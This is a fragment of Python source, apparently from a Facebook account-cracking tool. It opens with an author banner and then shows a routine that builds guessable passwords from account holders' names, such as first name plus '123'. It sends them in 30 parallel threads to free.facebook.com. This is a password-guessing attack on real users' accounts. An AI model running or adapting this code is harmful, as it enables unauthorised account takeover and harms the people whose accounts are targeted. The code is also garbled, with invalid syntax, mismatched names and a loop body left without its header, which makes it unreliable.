...
logo=""" ___________MR.MOLLA VAI____________
____________________________________________
github   : not found
Facebook : ROBIN MOLLA M.M
YouTube  : MOLLA CHELEN
Whatsapp : +8801863461968
-----------------------------------------------------
...
class __xx__:
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with Jadu molla vai(max_workers=30) as molla vai world:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                        	...
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123"]
                        mollavaiworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasl(ok,cp)
        elif chi in ('2', '02'):
            ...
            print(47*"-")
            with JaduMOLLA(max_workers=30) as MOLLA:
                #for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
